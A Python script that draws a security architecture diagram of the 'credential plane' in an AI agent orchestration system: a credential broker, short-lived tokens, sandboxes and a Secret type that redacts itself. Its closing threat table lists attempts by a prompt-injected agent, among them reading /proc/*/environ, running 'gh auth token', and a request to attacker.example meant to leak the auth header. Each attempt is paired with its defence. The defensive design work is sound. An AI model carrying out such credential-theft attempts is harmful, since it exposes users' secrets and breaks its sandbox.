from svgkit import Diagram, LINE, INK

PURPLE, GREEN, ORANGE, RED, BLUE, AMBER = "#7a3fd1", "#2e8b57", "#d9822b", "#c0392b", "#2f6fbf", "#b8860b"

def build():
    d = Diagram(1560, 1360, "05 · The credential plane — how an agent uses a secret it can never read",
                "Two paths (API tool, CLI tool), one broker, one Secret type, three .Reveal() sites. The agent's process and the credential's process never share a namespace.")

    d.zone(40, 86, 760, 520, "ZONE 1a · TCB — the only processes that hold plaintext", "tcb",
           "internal/tools/invoke.go · internal/creds/secret.go", subtitle_inside=True)
    d.zone(40, 640, 1480, 300, "ZONE 3 · SANDBOXES", "sandbox",
           "two jails · one node · separate pid/user/mount ns · joined only by /work", subtitle_x=1090)
    d.zone(840, 86, 680, 520, "OUTSIDE", "untrusted", "the credential's only legitimate destination", subtitle_inside=True)

    # TCB
    d.box("gw", 70, 130, 330, 118, "Tool gateway · stage 5 (execute)", kind="tcb",
          lines=["reached ONLY after the decision (stage 2) and", "the idempotency reservation (stage 3)",
                 "chooses the backend by tool.Backend.Kind", "http and cli are the two credentialed kinds",
                 "defer: broker.Revoke(cred.ID) on every path"])
    d.box("broker", 440, 130, 330, 118, "Credential broker · creds.DerivedBroker", kind="tcb", mono=True,
          lines=["roots[tenant][ref] = HMAC key  (AddRoot)",
                 "Mint(tenant, ref, ttl≤60s, cap 10m)",
                 " → aot_<tenant>.<id>.<exp>.<sig>",
                 "Revoke(id) → revoked set · Verify(tok,t,ref)",
                 "unknown ref → ErrNoSuchRef (fail closed)"])
    d.box("http", 70, 290, 330, 138, "API tool path · invokeHTTP (http.get / http.post)", kind="tcb",
          lines=["host already allowlisted + SSRF-checked at stage 2",
                 "cred := Mint(tenant, 'http/default', 60 s)",
                 "req.Header.Set('Authorization', 'Bearer '+cred.Value.Reveal())  ← site ①",
                 "the GATEWAY makes the request; body capped; status → is_error",
                 "the agent receives the response body only — never the header",
                 "http.post is Dangerous + UnsafeRetry → approval + 'may have taken effect'"])
    d.box("cli", 440, 290, 330, 138, "CLI tool path · invokeCLI (github.cli)", kind="tcb",
          lines=["argv[0] ∈ allowlist and no denied pattern (stage 2)",
                 "cred := Mint(tenant, 'github/token', 60 s)",
                 "sandbox.Run(Spec{RunID+'-broker', /opt/agentorch/bin/gh argv…,",
                 "  Network: proxy, ExtraReadOnly{gh: selfBin},",
                 "  Env: SafeEnv('GH_TOKEN='+cred.Value.Reveal() ← site ②, …)})",
                 "content = creds.Scrub(stdout+stderr, cred.Value)  ← site ③"])
    d.box("secret", 70, 458, 610, 122, "type Secret string — a leak is a type error, not a code-review item", kind="state", mono=True,
          lines=["String() · GoString() · Format() · MarshalJSON() → \"[REDACTED]\"  (fmt %v %+v %#v %s · slog · json)",
                 "Reveal() string   the ONLY way out; exactly 3 call sites, asserted by",
                 "  TestSecret_RevealCallSitesAreFewAndIntentional (walks the source, skips comments)",
                 "TestSecret_NeverRendersItsValue · TestSecret_SurvivesStructPrintingInsideAContainer",
                 "audit meta carries credential_id, credential_ref, credential_ttl_s — never the value"])
    d.arrow("gw", "http", "", src_side="s", dst_side="n", src_off=-80, color=PURPLE)
    d.arrow("gw", "cli", "", src_side="s", dst_side="n", src_off=80, dst_off=-80, via=[(315, 270), (525, 270)], color=PURPLE)
    d.arrow("http", "broker", "Mint · Revoke", src_side="n", dst_side="s", src_off=100, dst_off=-100, via=[(335, 262), (505, 262)], color=AMBER, label_at=(420, 262))
    d.arrow("cli", "broker", "Mint · Revoke", src_side="n", dst_side="s", src_off=100, dst_off=100, color=AMBER, label_at=(705, 270))

    # outside
    d.box("api", 870, 130, 620, 100, "Third-party API (GitHub) — internal/fakegithub in the PoC", kind="external",
          lines=["Verify(token, wantTenant, wantRef): parses aot_<tenant>.<id>.<exp>.<sig>; checks HMAC, expiry, tenant, ref",
                 "a token minted for tenant A is REJECTED on tenant B's repositories even if stolen",
                 "sees the token for ≤ 60 s; revocation makes a stolen token useless for the remaining seconds"])
    d.box("proxy", 870, 270, 620, 90, "Egress proxy (designed, not built)", kind="tcb",
          lines=["per-run domain allowlist for the broker sandbox; NetworkPolicy sandbox-broker-egress-via-proxy → :3128 only",
                 "PoC: the broker sandbox runs in the host network namespace and the docs label it as the weaker point",
                 "why it matters: it turns 'the CLI could reach anything' into 'the CLI can reach api.github.com'"])
    d.note(870, 390, 620, kind="untrusted", title="What the attacker controls, and what they do not",
           lines=["controls: the model's output (via prompt injection), everything under /work, the agent sandbox's CPU",
                  "does not control: which host receives the header (allowlist), which argv reaches gh (allowlist + denied patterns),",
                  "the token's lifetime (60 s), the token's tenant (HMAC root), the process that holds it (separate namespaces),",
                  "what the gateway logs (Secret type), what stdout carries back (Scrub)"])
    d.arrow("http", "api", "HTTPS + Authorization header · sent from the gateway pod", src_side="w", dst_side="w", src_off=40, dst_off=20,
            via=[(58, 399), (58, 596), (828, 596), (828, 200)], color=RED, label_at=(400, 596))
    d.arrow("proxy", "api", "allowlisted hosts only", src_side="n", dst_side="s", src_off=200, dst_off=200, style="dashed", color=RED)

    # sandboxes
    d.box("asbx", 70, 690, 440, 210, "AGENT SANDBOX — exec tools: argv in, stdout out, no secret, no network", kind="sandbox",
          lines=["uid 1000 · own pid ns · own user ns · own mount ns · EMPTY net ns",
                 "sees: /usr /bin /lib read-only, synthesised /etc, /work rw, /tmp rw",
                 "does NOT see: the broker process (pid ns), its environ (procfs is per-ns),",
                 "  the gateway, Postgres, the network, the host's /etc, any credential",
                 "cannot: ptrace (CapBnd=∅ + seccomp), connect (ENETUNREACH), mount, setns",
                 "CAN: write anything into /work — including files the CLI will later read",
                 "  → that is why argv and hosts are constrained by POLICY, not by trust in /work"])
    d.box("work", 560, 720, 220, 150, "/work", kind="neutral", mono=True,
          lines=["<root>/<tenant>/<run>", "bind-mounted rw into both", "nosuid · nodev re-applied", "the ONLY shared surface",
                 "WorkspaceManager owns it", "(designed) checkpoints → S3"])
    d.box("bsbx", 830, 690, 660, 210, "BROKER SANDBOX (github.cli) — trusted binary, hostile inputs", kind="broker",
          lines=["runs OUR image's binary as 'gh' (bind-mounted at /opt/agentorch/bin/gh; main() dispatches on argv[0])",
                 "separate pid ns and user ns from the agent sandbox — a fresh jail per call, torn down after",
                 "GH_TOKEN, GITHUB_API_BASE, AGENTORCH_TENANT in ITS environment only (sandbox.SafeEnv)",
                 "network: NetworkProxy — designed: egress proxy only · PoC: host netns (documented gap)",
                 "reads /work (e.g. a PR body the agent wrote) → an attacker-controlled INPUT to a trusted program",
                 "stdout/stderr → capped → Scrub(cred) → the model sees the result, never the token",
                 "wall-clock limit from tool.Backend.Timeout (20 s); exit≠0 → is_error"])
    d.arrow("asbx", "work", "", src_side="e", dst_side="w", style="dashed", color=ORANGE, bidir=True)
    d.arrow("work", "bsbx", "", src_side="e", dst_side="w", style="dashed", color=ORANGE, bidir=True)
    d.arrow("cli", "bsbx", "argv + GH_TOKEN env (one call, ≤ 60 s)", src_side="s", dst_side="n", src_off=120, dst_off=-200,
            via=[(725, 620), (960, 620)], color=ORANGE, width=2, label_at=(842, 620))
    d.arrow("bsbx", "api", "gh → GitHub API (via the egress proxy in production)", src_side="n", dst_side="s", src_off=250, dst_off=260,
            via=[(1410, 620), (1510, 620), (1510, 236), (1440, 236)], style="dashed", color=RED, label_at=(1200, 620))
    d.arrow("gw", "asbx", "", src_side="w", dst_side="n", src_off=-30, dst_off=-30,
            via=[(46, 159), (46, 622), (270, 622)], color=ORANGE, width=2)

    d.table(40, 970, [270, 350, 470, 430], [
        [["Attacker position"], ["Attempt"], ["What stops it (and where)"], ["Residual risk / gap"]],
        [["prompt-injected model"], ["github.cli argv ['auth','token']"], ["stage 2 params.denied_pattern — refused before any Mint; audited"],
         ["a new gh subcommand that prints the token would need a new denied pattern (allowlist argv[0] limits this)"]],
        [["model via exec.bash"], ["cat /proc/*/environ · ps · strace"], ["separate pid ns: the broker process does not exist in the agent's /proc; CapBnd=∅ blocks ptrace"],
         ["a kernel LPE breaks the pid-ns argument → production runs the pod under gVisor"]],
        [["model via http.get"], ["GET https://attacker.example/?x=… hoping the header follows"], ["stage 2 params.host_not_allowed + params.ssrf; header is set only inside invokeHTTP for the allowed host"],
         ["allowlist is per tool, per agent definition — it must be kept tight by whoever writes the agent"]],
        [["poisoned /work input"], ["a crafted PR body that makes gh misbehave"], ["gh is our trusted binary with an allowlisted argv; the token is scoped to one tenant + ref and lives ≤ 60 s; Revoke after the call"],
         ["a bug in the trusted binary could still misuse the token for those seconds (blast radius: one tenant, one ref)"]],
        [["our own logs / traces"], ["fmt.Println(cred) · json.Marshal(struct{...})"], ["type Secret redacts in every formatter; Reveal() count is a test failure if it grows"],
         ["a Reveal() in new code passes review only if the test's expected count is deliberately changed"]],
        [["another tenant"], ["replay tenant A's token against tenant B"], ["per-tenant HMAC roots; Verify checks tenant + ref + exp + sig; unknown tenant/ref fails closed"],
         ["roots are in memory in the PoC — production: KMS/Vault-backed roots, SPIFFE workload identity, rotation"]],
    ], kind="tcb")

    d.legend = [("tcb", "trusted computing base"), ("broker", "trusted binary holding a credential"), ("sandbox", "model-authored code"),
                ("state", "type-level guarantee"), ("external", "outside our control"), ("neutral", "shared surface")]
    return d

if __name__ == "__main__":
    build().save("../svg/05-credential-plane.svg")
